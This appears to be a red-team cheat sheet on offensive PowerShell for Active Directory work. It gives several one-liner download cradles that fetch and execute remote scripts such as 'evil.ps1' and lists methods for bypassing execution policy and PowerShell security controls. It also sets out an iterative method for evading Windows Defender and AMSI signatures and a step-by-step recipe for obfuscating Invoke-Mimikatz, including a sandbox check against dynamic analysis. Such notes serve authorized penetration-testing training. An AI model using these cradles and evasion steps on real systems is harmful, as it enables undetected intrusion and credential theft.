# PowerShell Scripts and Modules

Load a PowerShell script using dot sourcing
  
```PowerShell
  . C:\AD\Tools\PowerView.ps1
```

A module (or a script) can be imported with:

```powershell
Import-Module C:\AD\Tools\ADModule-master\ActiveDirectory\ActiveDirectory.psd1
```

All the commands in a module can be listed with:

```powershell
Get-Command -Module <modulename>
```

# PowerShell Script Execution

```powershell
iex (New-Object Net.WebClient).DownloadString('https://webserver/payload.ps1')
```

```powershell
$ie=New-Object -ComObject InternetExplorer.Application;$ie.visible=$False;$ie.navigate('http://$IP/evil.ps1 ');sleep 5;$response=$ie.Document.body.innerHTML;$ie.quit();iex $response
```

```powershell
# PSv3 onwards
iex (iwr 'http://$IP/evil.ps1')
```

```powershell
$h=New-Object -ComObject Msxml2.XMLHTTP;$h.open('GET','http://$IP/evil.ps1',$false);$h.send();iex $h.responseText
```

```powershell
$wr = [System.NET.WebRequest]::Create("http://$IP/evil.ps1") $r = $wr.GetResponse() IEX ([System.IO.StreamReader]($r.GetResponseStream())).ReadToEnd()
```

# Execution Policy

It is NOT a security measure, it is present to prevent user from accidently executing scripts.

Several ways to bypass

```PowerShell
powershell -ExecutionPolicy bypass
powershell -c <cmd>
powershell -encodedcommand
$env:PSExecutionPolicyPreference="bypass"
```

> [!info] Resources
> 15 ways to bypass PowerShell execution policy https://www.netspi.com/blog/entryid/238/15-ways-to-bypass-the-powershell-execution-policy

# Bypassing PowerShell Security

Use **`Invisi-Shell`** ( https://github.com/OmerYa/Invisi-Shell) for bypassing the security controls in PowerShell

## Using Invisi-Shell

**With admin privileges:**

```powershell
RunWithPathAsAdmin.bat
```

**With non-admin privileges:**

```powershell
RunWithRegistryNonAdmin.bat
```

# Bypassing AV Signatures for PowerShell

We can use the **AMSITrigger** (https://github.com/RythmStick/AMSITrigger ) or **DefenderCheck** (https://github.com/t3hbb/DefenderCheck ) to identify code and strings from a binary or script that Windows Defender may flag.

Simply provide path to the script file to scan it: 

```powershell
AmsiTrigger_x64.exe -i C:\AD\Tools\Invoke-PowerShellTcp_Detected.ps1 

DefenderCheck.exe PowerUp.ps1
```

For full obfuscation of PowerShell scripts, see **Invoke-Obfuscation** ( https://github.com/danielbohannon/Invoke-Obfuscation).

> [!info] Resources
> More on PowerShell obfuscation - https://github.com/t3l3machus/PowerShell Obfuscation-Bible

Steps to avoid signature based detection are pretty simple:
1) Scan using AMSITrigger
2) Modify the detected code snippet
3) Rescan using AMSITrigger
4) Repeat the steps 2 & 3 till we get a result as “AMSI_RESULT_NOT_DETECTED” or “Blank

> [!note]
> If we scanned something with **DefenderCheck**, we can take the bytes from the output and find the corresponding line using **ByteToLineNumber.ps1**

## Bypassing AV Signatures for PowerShell - Invoke Mimikatz

There are multiple detections. We need to make the following changes: 
1. Remove default comments.
2. Rename the script, function names and variables.
3. Modify the variable names of the Win32 API calls that are detected.
4. Obfuscate PEBytes content → PowerKatz dll using packers.
5. Implement a reverse function for PEBytes to avoid any static signatures.
6. Add a sandbox check to waste dynamic analysis resources. 
7. Remove Reflective PE warnings for a clean output.
8. Use obfuscated commands for Invoke-MimiEx execution. 
9. Analysis using DefenderCheck

